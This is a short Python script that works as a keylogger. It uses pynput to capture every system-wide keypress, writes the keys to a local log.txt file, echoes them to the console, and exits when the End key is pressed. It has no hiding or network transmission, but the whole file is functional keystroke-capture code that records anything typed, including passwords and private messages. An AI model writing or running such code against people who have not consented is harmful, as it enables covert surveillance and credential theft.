from pynput.keyboard import Listener
import sys


def on_press(key):
    key = str(key).replace("'","")

    if key == 'Key.end':
        print("Program successfully ended!")
        sys.exit()
    if key == 'Key.enter':
        key = "\n"
    if key == 'Key.space':
        key = " "
    key = key.replace("Key.", " Key.")

    with open("log.txt", "a") as f:
        f.write(key)
    print(key)

# def remove_repeat(msg):
#     new = list(msg)[0] if " " not in msg else msg.split(" ")[1]
#     return new

     
with Listener(on_press=on_press) as listener:
	listener.join()


